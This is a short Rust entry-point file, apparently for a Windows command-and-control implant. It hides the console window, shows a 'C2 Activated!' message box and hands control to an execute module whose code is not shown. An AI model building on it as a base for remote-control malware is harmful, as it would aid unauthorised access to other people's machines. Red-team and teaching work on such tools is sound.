#![windows_subsystem = "windows"]
use windows::core::{PCSTR, s};
use windows::Win32::Foundation::HWND;
use windows::Win32::UI::WindowsAndMessaging::{MessageBoxA, MESSAGEBOX_STYLE};
mod execute;
use execute::execute;
mod cmd;
mod config;

///
/// Displays a Windows MessageBox at launch
///
fn show_messagebox(msg: PCSTR) {
    unsafe {
        MessageBoxA(
            HWND(0),
            msg,
            s!("Hello!"),
            MESSAGEBOX_STYLE(0),
        );
    }
}

fn main() {
    show_messagebox(s!("C2 Activated!"));
    execute();
}
